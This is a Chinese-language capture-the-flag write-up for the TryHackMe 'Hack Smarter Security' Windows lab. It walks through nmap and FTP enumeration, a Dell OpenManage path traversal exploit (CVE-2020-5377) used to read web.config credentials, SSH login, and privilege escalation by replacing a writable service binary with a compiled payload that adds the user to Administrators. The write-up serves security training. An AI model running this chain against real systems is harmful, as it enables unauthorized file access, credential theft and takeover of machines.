## 概述

來源: [tryhackme](https://tryhackme.com/room/hacksmartersecurity)  
題目: Hack Smarter Security
難度: medium  
靶機: `10.10.176.146`

## Enum

### nmap
```bash
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HackSmarterSec
|_http-server-header: Microsoft-IIS/10.0
1311/tcp open  ssl/rxmon?
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Issuer: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-30T19:03:17
| Not valid after:  2025-06-29T19:03:17
| MD5:   4276:b53d:a8ab:fa7c:10c0:1535:ff41:2928
|_SHA-1: c44f:51f8:ed54:802f:bb94:d0ea:705d:50f8:fd96:f49f
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Mon, 10 Nov 2025 10:32:45 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Mon, 10 Nov 2025 10:32:53 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-11-10T10:33:59+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=hacksmartersec
| Issuer: commonName=hacksmartersec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-09T10:27:48
| Not valid after:  2026-05-11T10:27:48
| MD5:   6698:17f7:1db9:5e2c:1742:390a:c7cc:af3b
|_SHA-1: 6a09:eaed:ff30:2369:9187:6e83:d188:defe:9397:906f
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-10T10:33:47+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.95%T=SSL%I=7%D=11/10%Time=6911BF4D%P=aarch64-unknown-l
SF:inux-gnu%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Se
SF:curity:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:
SF:\x20accept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate
SF::\x20Mon,\x2010\x20Nov\x202025\x2010:32:45\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0
SF:\x20Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.
SF:dtd\">\r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20c
SF:ontent=\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</ti
SF:tle>\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma
SF:/css/loginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<sc
SF:ript\x20type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20la
SF:nguage=\"javascript\"></script><script\x20type=\"text/javascript\"\x20s
SF:rc=\"/oma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\
SF:x20type=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=
SF:\"javascript\"></script><script\x20language=\"javascript\">\r\n\x20")%r
SF:(HTTPOptions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x
SF:20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accep
SF:t-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Mon,
SF:\x2010\x20Nov\x202025\x2010:32:53\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Stric
SF:t//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\
SF:n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"
SF:text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<
SF:link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/logi
SF:nmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20t
SF:ype=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"
SF:javascript\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma
SF:/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type=\
SF:"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascr
SF:ipt\"></script><script\x20language=\"javascript\">\r\n\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### ftp
```bash
└─$ ftp hsa.thm      
Connected to hsa.thm.
220 Microsoft FTP Service
Name (hsa.thm:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

```bash
ftp> ls
229 Entering Extended Passive Mode (|||49725|)
125 Data connection already open; Transfer starting.
06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
06-28-23  03:00PM              1022126 stolen-passport.png
226 Transfer complete.
```

```bash
ftp> get Credit-Cards-We-Pwned.txt
local: Credit-Cards-We-Pwned.txt remote: Credit-Cards-We-Pwned.txt
229 Entering Extended Passive Mode (|||49731|)
125 Data connection already open; Transfer starting.
100% |*******************************|  3722        7.89 KiB/s    00:00 ETA
226 Transfer complete.
3722 bytes received in 00:00 (7.88 KiB/s)
```

```bash
ftp> get stolen-passport.png
local: stolen-passport.png remote: stolen-passport.png
229 Entering Extended Passive Mode (|||49796|)
125 Data connection already open; Transfer starting.
  3% |                               | 38640       37.70 KiB/s    00:25 ETAftp: Reading from network: Interrupted system call
  0% |                               |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 164 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
ftp> binary 
200 Type set to I.
ftp> get stolen-passport.png
local: stolen-passport.png remote: stolen-passport.png
229 Entering Extended Passive Mode (|||49797|)
150 Opening BINARY mode data connection.
100% |*******************************|   998 KiB  183.88 KiB/s    00:00 ETA
226 Transfer complete.
1022126 bytes received in 00:05 (183.87 KiB/s)
```
是一個護照好像沒有功用

### gobuster
```bash
┌──(kali㉿kali)-[~/tryhackme/hsa]
└─$ gobuster dir -u http://hsa.thm -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://hsa.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Images               (Status: 301) [Size: 145] [--> http://hsa.thm/Images/]
/css                  (Status: 301) [Size: 142] [--> http://hsa.thm/css/]
/images               (Status: 301) [Size: 145] [--> http://hsa.thm/images/]
/index.html           (Status: 200) [Size: 3998]
/js                   (Status: 301) [Size: 141] [--> http://hsa.thm/js/]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================

```

### dell-emc-openmanage-server
找到
```bash
https://hacksmartersec:1311/
```
跳轉到
```bash
https://hacksmartersec:1311/OMSALogin?msgStatus=null
```
點擊 about 發現 版本號 9.4.0.2
```bash
https://hacksmartersec:1311/UOMSAAbout
```

google `OMSA 9.4.0.2 exploit`  
https://www.dell.com/support/kbdoc/en-us/000176967/dsa-2020-172-dell-emc-openmanage-server-administrator-omsa-path-traversal-vulnerability  

可發現 `CVE-2020-5377` 漏洞
```bash
Dell EMC OpenManage Server Administrator (OMSA) versions 9.4 and prior contain multiple path traversal vulnerabilities.  An unauthenticated remote attacker could potentially exploit these vulnerabilities by sending a crafted Web API request containing directory traversal character sequences to gain file system access on the compromised management station.  
```

#### searchsploit
```bash
┌──(kali㉿kali)-[~/tryhackme/hsa]
└─$ searchsploit dell openmanage
------------------------------------------ ---------------------------------
 Exploit Title                            |  Path
------------------------------------------ ---------------------------------
Dell OpenManage Network Manager 6.2.0.51  | linux/webapps/45852.py
Dell OpenManage Server Administrator - Cr | multiple/remote/38179.txt
Dell OpenManage Server Administrator 8.2  | windows/webapps/39486.txt
Dell OpenManage Server Administrator 8.3  | xml/webapps/39909.rb
Dell OpenManage Server Administrator 9.4. | windows/webapps/49750.py
------------------------------------------ ---------------------------------
Shellcodes: No Results

```

```bash
┌──(kali㉿kali)-[~/tryhackme/hsa]
└─$ python3 /usr/share/exploitdb/exploits/windows/webapps/49750.py 10.4.11.38 hsa.thm 1311
  File "/usr/share/exploitdb/exploits/windows/webapps/49750.py", line 27
        print 'Usage python auth_bypass.py <yourIP> <targetIP>:<targetPort>'
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?        
```

```bash
┌──(kali㉿kali)-[~/tryhackme/hsa]
└─$ python3 49750.py 10.4.11.38 hsa.thm 1311 
  File "/home/kali/tryhackme/hsa/49750.py", line 114
    path = path.replace('\\','/')
TabError: inconsistent use of tabs and spaces in indentation

```

因為是 python2 有調整一下 print 用法但還是報錯  
直接 google 找其他 poc

#### CVE-2020-5377
google `CVE-2020-5377 exploit`  
找到 大神分析原理 可參考  
https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/  
POC  
https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py  


```bash
┌──(kali㉿kali)-[~/tryhackme/hsa]
└─$ python3 CVE-2020-5377.py 10.4.11.38 hacksmartersec:1311
[-] No server.pem certificate file found. Generating one...
.+....+.....+...+....+...+.....+.............+..............+....+.....+.......+...+..+..........+..+...+.......+..+...............+.+..+...+.............+......+...+...........+.+...+++++++++++++++++++++++++++++++++++++++*..+......+................+...+..+...+.+........+.......+.....+.+............+...............+..+...+...+...+.+......+..+......+++++++++++++++++++++++++++++++++++++++*..+......+....+...........+..........+.........+.........+..+.+.....+....+...+........+.......+...+........+......+.+..................+..+....+.....+.+..............+......+...+......+..........+...........+...+....+.....+...+...+......................+..+.+..+.......+.......................+.......+............+...+.....+......+.........+..........+...+..+.+......+........+..........+..+.+.........+.....+.+.....+.......+......+......+...+..+...+...+...+.+...+...+............+...+........+......+.+...+.....+.+...+..+.+..+......+............+............+.+......+.....+...+.+..+...+....+.....+............+................+.....+....++++++
..+.+......+...+++++++++++++++++++++++++++++++++++++++*..+......+......+.........+..............+....+...+..+++++++++++++++++++++++++++++++++++++++*.+...+...............+.......+..+.........+....+......+...........+...+.+..+...+............+...+....+...........+......+...+..........+..+.+........+............+........................+...................+.........+...+..+......+.+..............+............+...+.+.....+.+........+....+...+..+................+.....+....+...........+.+..............................+...+.....+.......+.....+......+.........+.+...+.........+.....+.+..+.......+...+...+......+.....+.+........................+.....+...+......+....+...+.....+.........+.+..+..........+.....+.......+......+........+.......+...+......+....................+...............+.+...+..+.........+...+..........+.....+.+.....+.+...+......+.....+....+............+...........+...+...................+..+................+...+......+...........+...+..........+..+...+.......+........+...................+.....+.............+........+....+.....................+.........+...............+.....+......+..........+...........+.+.....+...+....+..+....+...........+.+..+...+....+........+..........+...........+......+...+......+.+.........+..+............+................+.....+......+......+............+.+............+...+..+...+.+...+..+...+......+...............+.......+..+.......+...+...............+..+......+....+...+........+...+.........+...+...+......+...+............+....+..+....+........+...+.......+........+...............+....+........+..........+.....+...+...+....+.....+............+.+............+..+.+............+......+..+.......+...++++++
-----
Session: 81FC6CE19A3BBCC604FD9B7A56E93EC2
VID: 9802057ECEC78BE4

file > C:\windows\win.ini
Reading contents of C:\windows\win.ini:
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

發現 帳號密碼
```bash
file > C:\inetpub\wwwroot\hacksmartersec\web.config
Reading contents of C:\inetpub\wwwroot\hacksmartersec\web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="I...!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>


file > 

```

## initial access
嘗試登入 ssh 成功
```bash
┌──(kali㉿kali)-[~/tryhackme/hsa]
└─$ ssh tyler@hsa.thm                              
The authenticity of host 'hsa.thm (10.10.176.146)' can't be established.
ED25519 key fingerprint is SHA256:MvevGrInODrfb/nv+rYdT743Q0BOkhOmNo5qlrhXCUg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'hsa.thm' (ED25519) to the list of known hosts.
tyler@hsa.thm's password: 
Microsoft Windows [Version 10.0.17763.1821] 
(c) 2018 Microsoft Corporation. All rights reserved. 
                                                     
tyler@HACKSMARTERSEC C:\Users\tyler>   
```

### user.txt
取得 user.txt
```bash
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>type user.txt
THM{...} 
```
## Privilege Enumcation
參考大神用法
https://0xb0b.gitbook.io/writeups/tryhackme/2024/hack-smarter-security

### PrivescCheck
https://github.com/itm4n/PrivescCheck/releases/tag/2025.11.09-1
先下載到本機  
再開 http.server   
下載到靶機  
```bash
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>curl 10.4.11.38/PrivescCheck.ps1
 -o PrivescCheck.ps1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Curr
ent
                                 Dload  Upload   Total   Spent    Left  Spee
d
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--    
  0  210k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--    
 17  210k   17 37352    0     0  18676      0  0:00:11  0:00:02  0:00:09 181
 38  210k   38 83720    0     0  41860      0  0:00:05  0:00:02  0:00:03 311
 71  210k   71  150k    0     0  51520      0  0:00:04  0:00:03  0:00:01 398
100  210k  100  210k    0     0  53814      0  0:00:04  0:00:04 --:--:-- 492
01


```
進入 powershell  
執行
```bash
tyler@HACKSMARTERSEC C:\Users\tyler\Desktop>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\tyler\Desktop> . .\PrivescCheck.ps1; Invoke-PrivescCheck -Extend
ed                                                                          
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
┃ NAME     ┃ User - Identity                                   ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Get information about the current user (name, domain name)   ┃
┃ and its access token (SID, integrity level, authentication   ┃
┃ ID).                                                         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Name             : HACKSMARTERSEC\tyler
SID              : S-1-5-21-1966530601-3185510712-10604624-1008
IntegrityLevel   : Medium Mandatory Level (S-1-16-8192)
SessionId        : 0
TokenId          : 00000000-00075dd9
AuthenticationId : 00000000-00051f13
OriginId         : 00000000-000003e7
ModifiedId       : 00000000-00051f29
Source           : Advapi (00000000-00051efd)
...
```

### spoofer-scheduler
找到 高危險項目 spoofer-scheduler
```bash
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Services - Image File Permissions                 ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service's binary or its folder.                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


Name              : spoofer-scheduler
DisplayName       : Spoofer Scheduler
User              : LocalSystem
ImagePath         : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe    
StartMode         : Automatic
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\spoofer-schedule 
                    r
Status            : Running
UserCanStart      : True
UserCanStop       : True
ModifiablePath    : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe    
IdentityReference : BUILTIN\Users (S-1-5-32-545)
Permissions       : AllAccess



[*] Status: Vulnerable - Severity: High - Execution time: 00:00:17.220  
```

#### 備份 spoofer-scheduler.exe
注意以下已 cmd.exe 操作

```bash
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>copy spoofer-scheduler.e
xe spoofer-scheduler.exe.bak
        1 file(s) copied.

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files (x86)\Spoofer

11/14/2025  04:58 AM    <DIR>          .
11/14/2025  04:58 AM    <DIR>          ..
07/24/2020  09:31 PM            16,772 CHANGES.txt
07/16/2020  07:23 PM             7,537 firewall.vbs
07/24/2020  09:31 PM            82,272 LICENSE.txt
07/24/2020  09:31 PM             3,097 README.txt
07/24/2020  09:31 PM            48,776 restore.exe
07/20/2020  11:12 PM           575,488 scamper.exe
06/30/2023  06:57 PM               152 shortcuts.ini
07/24/2020  09:31 PM         4,315,064 spoofer-cli.exe
07/24/2020  09:31 PM        16,171,448 spoofer-gui.exe
07/24/2020  09:31 PM         4,064,696 spoofer-prober.exe
07/24/2020  09:31 PM         8,307,640 spoofer-scheduler.exe
07/24/2020  09:31 PM         8,307,640 spoofer-scheduler.exe.bak
07/24/2020  09:31 PM               667 THANKS.txt
07/24/2020  09:31 PM           217,416 uninstall.exe
              14 File(s)     42,118,665 bytes
               2 Dir(s)  13,904,859,136 bytes free

```

#### 關閉 spoofer-scheduler 服務
```bash
# 可先確認是否有該服務 sc query spoofer-scheduler
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>sc query spoofer-schedul
er
 
SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)     
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>sc stop spoofer-schedule
r

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)     
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0x0

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>sc query spoofer-schedul
er

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

#### 靶機下載 payload
參考大神的 payload  
https://jaxafed.github.io/posts/tryhackme-hack_smarter_security/  

先在本機製作 [payload.c](payload.c)  
功用是把現在的使用者加到 admin 群組  
```bash
└─$ cat spoofer-scheduler.c
#include <stdlib.h>

int main() {
  system("cmd.exe /c net localgroup Administrators tyler /add");
  return 0;
}
┌──(kali㉿kali)-[~/tools]
└─$ x86_64-w64-mingw32-gcc-win32 spoofer-scheduler.c -o spoofer-scheduler.exe

```
本機開 http.server
```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.65.127 - - [14/Nov/2025 12:59:13] "GET /spoofer-scheduler.exe HTTP/1.1" 200 -
```

```bash
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>curl 10.4.11.38/spoofer-scheduler.exe -o spoofer-scheduler.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Curr
ent
                                 Dload  Upload   Total   Spent    Left  Spee
d
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--    
  0  110k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--    
 11  110k   11 12880    0     0  12880      0  0:00:08  0:00:01  0:00:07  78
 82  110k   82 92736    0     0  46368      0  0:00:02  0:00:02 --:--:-- 339
100  110k  100  110k    0     0  56448      0  0:00:02  0:00:02 --:--:-- 410
53

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files (x86)\Spoofer

11/14/2025  04:58 AM    <DIR>          .
11/14/2025  04:58 AM    <DIR>          ..
07/24/2020  09:31 PM            16,772 CHANGES.txt
07/16/2020  07:23 PM             7,537 firewall.vbs
07/24/2020  09:31 PM            82,272 LICENSE.txt
07/24/2020  09:31 PM             3,097 README.txt
07/24/2020  09:31 PM            48,776 restore.exe
07/20/2020  11:12 PM           575,488 scamper.exe
06/30/2023  06:57 PM               152 shortcuts.ini
07/24/2020  09:31 PM         4,315,064 spoofer-cli.exe
07/24/2020  09:31 PM        16,171,448 spoofer-gui.exe
07/24/2020  09:31 PM         4,064,696 spoofer-prober.exe
11/14/2025  04:59 AM           112,897 spoofer-scheduler.exe
07/24/2020  09:31 PM         8,307,640 spoofer-scheduler.exe.bak
07/24/2020  09:31 PM               667 THANKS.txt
07/24/2020  09:31 PM           217,416 uninstall.exe
              14 File(s)     33,923,922 bytes
               2 Dir(s)  13,912,649,728 bytes free

```

#### 執行服務

```bash
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>sc start spoofer-schedul
er
[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fash
ion.

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attribu
tes
====================================== ================ ============ =======
===========================================
Everyone                               Well-known group S-1-1-0      Mandato
ry group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandato
ry group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandato
ry group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandato
ry group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandato
ry group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandato
ry group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandato
ry group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

```
雖然有錯   
且當下的群組也沒變  
但嘗試重登 ssh 後得到了 admin 權限  

#### get admin
重登 ssh
```bash
tyler@HACKSMARTERSEC C:\Users\tyler>whoami /groups
 
GROUP INFORMATION
-----------------

Group Name                                                    Type
   SID          Attributes

============================================================= ==============
== ============ ============================================================
===
Everyone                                                      Well-known gro
up S-1-1-0      Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Local account and member of Administrators group Well-known gro
up S-1-5-114    Mandatory group, Enabled by default, Enabled group

BUILTIN\Users                                                 Alias
   S-1-5-32-545 Mandatory group, Enabled by default, Enabled group

BUILTIN\Administrators                                        Alias
   S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group ow
ner
NT AUTHORITY\NETWORK                                          Well-known gro
up S-1-5-2      Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Authenticated Users                              Well-known gro
up S-1-5-11     Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\This Organization                                Well-known gro
up S-1-5-15     Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Local account                                    Well-known gro
up S-1-5-113    Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\NTLM Authentication                              Well-known gro
up S-1-5-64-10  Mandatory group, Enabled by default, Enabled group

Mandatory Label\High Mandatory Level                          Label
   S-1-16-12288

```

#### get flag
```bash
tyler@HACKSMARTERSEC C:\Users\Administrator\Desktop\Hacking-Targets>type hac
king-targets.txt
Next Victims:
C...n

```

## Q&A
- [FTP binary 模式 & ASCII 模式](QA-ftp-status.md)
下載圖片記得切成 binary 模式
- [windows 提權參考](QA-windows-提權.md)